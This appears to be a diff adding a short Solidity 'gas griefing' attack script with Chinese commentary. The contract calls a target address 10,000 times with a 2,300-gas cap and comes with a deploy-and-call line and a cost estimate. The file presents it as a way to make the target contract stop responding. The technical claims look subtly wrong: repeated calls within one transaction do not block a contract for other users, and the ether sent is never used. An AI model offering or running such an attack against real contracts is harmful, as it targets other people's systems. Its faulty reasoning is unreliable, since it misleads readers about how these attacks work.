@@ -1,0 +1,15 @@
+Gas 耗尽攻击脚本（针对目标合约）：
+
+contract GasGriefing {
+    function attack(address target) external payable {
+        for (uint i; i < 10000; i++) {
+            (bool ok,) = target.call{gas: 2300}("");
+            // ignore ok — each call to 0x1234567890AbcdEF1234567890AbcDef12345678 costs 2300 gas
+        }
+    }
+}
+
+// 部署并调用：
+griefing.attack{value: 1 ether}(0x1234567890AbcdEF1234567890AbcDef12345678);
+
+预计消耗 23,000,000 gas，约合 0.46 ETH 手续费（20 gwei）。目标合约将因接连收到大量调用而无法正常响应。
